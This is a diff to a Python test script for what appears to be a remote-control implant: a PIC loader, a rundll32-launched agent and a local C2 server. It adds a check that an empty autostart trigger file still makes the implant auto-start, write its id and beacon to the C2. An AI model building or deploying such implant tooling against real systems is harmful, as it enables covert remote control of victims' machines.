@@ -7,6 +7,7 @@
 # 两个阶段:
 #   P1 有 autostart.args(显式参数)→ 完整远控 + 跨进程优雅停止
 #   P2 无 autostart.args          → 按内置默认配置自启(加载即自启的默认分支)
+#   P3 autostart.args 为空文件    → 与"不存在"同样按内置默认配置自启
 #
 # 注意:自启是"加载即生效",所以 rundll32 的 Start/Stop 与它之间有 300ms 竞争窗口
 # (见 client/core/agent_dll.cpp 文件头)。P1 的停止步骤把触发器留在原处,让 Stop
@@ -193,6 +194,7 @@ def main():
     runpic = None
     sh = None
     p2 = None
+    p3 = None
     try:
         # 2) C2 服务器(日志落盘)
         with open(C2_LOG, "w", encoding="utf-8", errors="replace") as f:
@@ -326,6 +328,37 @@ def main():
             time.sleep(0.5)
         check("P2 无触发器:默认 beacon 上线", registered_count() > before,
               f"registered={registered_count()} before={before}")
+
+        # ---- P3:autostart.args **存在但内容为空** → 与"文件不存在"同样走默认配置 ----
+        #     (旧行为:空文件也算"触发了",日志说 trigger 但实际用默认值;现在两者语义一致)
+        if p2 and p2.poll() is None:
+            p2.kill()
+            p2.wait(timeout=5)
+        if os.path.exists(DEFAULT_ID):
+            os.remove(DEFAULT_ID)          # 让"默认 id 重新落盘"这一步有观测意义
+        with open(TRIGGER, "w", encoding="utf-8"):
+            pass                            # 建一个**空**触发器文件
+        before3 = registered_count()
+        p3_log = os.path.join(WORK, "runpic_p3.log")
+        with open(p3_log, "w", encoding="utf-8", errors="replace") as f:
+            p3 = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
+                                  stdout=f, stderr=subprocess.STDOUT,
+                                  cwd=ROOT, env=CHILD_ENV)
+        t0 = time.time()
+        while time.time() - t0 < 20 and not os.path.exists(DEFAULT_ID):
+            time.sleep(0.5)
+        p3_txt = read_text(p3_log)
+        check("P3 loader 正常执行", "loader thread exited" in p3_txt, repr(p3_txt[-120:]))
+        check("P3 空触发器:仍走默认配置(未被当成触发)",
+              "autostart (no trigger -> default config)" in p3_txt, repr(p3_txt[-200:]))
+        check("P3 空触发器:日志点明原因",
+              "is empty -> treated as no trigger" in p3_txt, repr(p3_txt[-200:]))
+        check("P3 空触发器:默认 id 落盘", os.path.exists(DEFAULT_ID), fwd(DEFAULT_ID))
+        t0 = time.time()
+        while time.time() - t0 < 20 and registered_count() <= before3:
+            time.sleep(0.5)
+        check("P3 空触发器:默认 beacon 上线", registered_count() > before3,
+              f"registered={registered_count()} before={before3}")
     finally:
         # 8) 收尾:杀宿主与服务器(触发器文件保留与否已不影响行为,顺手清掉)
         if sh:
@@ -335,7 +368,7 @@ def main():
                 os.remove(TRIGGER)
         except OSError:
             pass
-        for proc in (runpic, p2):
+        for proc in (runpic, p2, p3):
             if proc and proc.poll() is None:
                 proc.kill()
                 try:
